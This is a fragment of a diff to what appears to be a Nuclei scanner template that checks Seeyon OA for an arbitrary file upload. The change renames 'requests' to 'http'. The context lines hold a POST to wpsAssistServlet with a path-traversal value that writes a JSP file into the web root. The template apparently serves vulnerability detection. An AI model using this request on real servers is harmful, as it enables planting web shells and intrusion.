@@ -8,7 +8,7 @@ info:
     - https://github.com/coldrainh
   tags: Seeyon,oa,upload
 
-requests:
+http:
   - method: POST
     path:
       - '{{BaseURL}}/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2'
